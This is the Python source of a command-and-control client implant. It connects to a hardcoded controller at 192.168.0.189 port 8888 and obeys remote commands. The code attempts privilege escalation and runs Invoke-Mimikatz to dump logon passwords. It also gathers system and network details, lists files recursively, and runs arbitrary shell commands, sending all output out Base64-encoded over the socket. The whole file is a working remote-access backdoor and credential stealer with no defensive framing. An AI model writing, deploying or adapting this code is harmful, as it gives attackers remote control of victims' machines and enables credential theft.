import socket
import time
import os
import json
import subprocess
import platform
import base64  # 用于Base64编码

class C2Client:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port

    def connect_to_server(self):
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_ip, self.server_port))
                print("Connected to C2 server")
                self.send_system_info()
                break
            except Exception as e:
                print(f"Connection failed: {e}")
                time.sleep(5)

    def send_system_info(self):
        system_info = {
            "system": platform.system(),
            "user": os.getlogin()
        }
        self.socket.send(json.dumps(system_info).encode())

    def execute_privilege_escalation(self):
        try:
            winlogon_process = subprocess.run(["powershell", "-Command", "(Get-Process winlogon).Id"], capture_output=True, text=True)
            winlogon_pid = winlogon_process.stdout.strip()
            if winlogon_pid:
                privilege_command = r'powershell -Command "Start-Process cmd -ArgumentList \'/c whoami\' -Verb runAs"'
                subprocess.run(privilege_command, shell=True)
                print("Privilege escalation executed")
                self.socket.send(json.dumps({"result": "Privilege escalation executed"}).encode())
            else:
                print("Failed to find Winlogon process ID")
                self.socket.send(json.dumps({"result": "Failed to find Winlogon process ID"}).encode())
        except Exception as e:
            print(f"Error during privilege escalation: {e}")
            self.socket.send(json.dumps({"result": f"Error during privilege escalation: {e}"}).encode())

    def execute_mimikatz(self, script_path):
        try:
            mimikatz_command = f'powershell -ExecutionPolicy Bypass -Command "& {{ . \'{script_path}\'; Invoke-Mimikatz -Command \'privilege::debug sekurlsa::logonpasswords\' }}"'
            result = subprocess.run(mimikatz_command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            encoded_output = base64.b64encode(output.encode()).decode()
            print(f"Mimikatz executed, result: {encoded_output}")
            self.socket.send(json.dumps({"result": encoded_output}).encode())
        except Exception as e:
            print(f"Error during Mimikatz execution: {e}")
            self.socket.send(json.dumps({"result": f"Error during Mimikatz execution: {e}"}).encode())

    def collect_system_info(self):
        try:
            system_info_command = 'powershell -Command "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -Property Name, Manufacturer, Model, TotalPhysicalMemory"'
            result = subprocess.run(system_info_command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            encoded_output = base64.b64encode(output.encode()).decode()
            print(f"System info collected, result: {encoded_output}")
            self.socket.send(json.dumps({"result": encoded_output}).encode())
        except Exception as e:
            print(f"Error during system info collection: {e}")
            self.socket.send(json.dumps({"result": f"Error during system info collection: {e}"}).encode())

    def collect_network_info(self):
        try:
            network_info_command = 'powershell -Command "Get-NetIPAddress; Get-NetRoute"'
            result = subprocess.run(network_info_command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            encoded_output = base64.b64encode(output.encode()).decode()
            print(f"Network info collected, result: {encoded_output}")
            self.socket.send(json.dumps({"result": encoded_output}).encode())
        except Exception as e:
            print(f"Error during network info collection: {e}")
            self.socket.send(json.dumps({"result": f"Error during network info collection: {e}"}).encode())

    def search_sensitive_files(self, search_path):
        try:
            file_search_command = f'powershell -Command "Get-ChildItem -Path {search_path} -Recurse"'
            result = subprocess.run(file_search_command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            encoded_output = base64.b64encode(output.encode()).decode()
            print(f"File search completed, result: {encoded_output}")
            self.socket.send(json.dumps({"result": encoded_output}).encode())
        except Exception as e:
            print(f"Error during file search: {e}")
            self.socket.send(json.dumps({"result": f"Error during file search: {e}"}).encode())

    def listen_for_commands(self):
        while True:
            try:
                data = self.socket.recv(4096).decode()
                if not data:
                    continue
                data = json.loads(data)
                if "command" in data:
                    command = data["command"]
                    print(f"Received command: {command}")
                    if command == "exit":
                        self.socket.close()
                        break
                    elif command == "privesc":
                        self.execute_privilege_escalation()
                    elif command.startswith("mimikatz"):
                        _, script_path = command.split(maxsplit=1)
                        self.execute_mimikatz(script_path)
                    elif command == "system_info":
                        self.collect_system_info()
                    elif command == "network_info":
                        self.collect_network_info()
                    elif command.startswith("file_search"):
                        _, search_path = command.split(maxsplit=1)
                        self.search_sensitive_files(search_path)
                    else:
                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
                        output = result.stdout + result.stderr
                        encoded_output = base64.b64encode(output.encode()).decode()
                        self.socket.send(json.dumps({"result": encoded_output}).encode())
            except (ValueError, json.JSONDecodeError) as e:
                print(f"Error decoding: {e}")
            except Exception as e:
                print(f"Error: {e}")
                self.socket.close()
                self.connect_to_server()

if __name__ == "__main__":
    client = C2Client("192.168.0.189", 8888)
    client.connect_to_server()
    client.listen_for_commands()
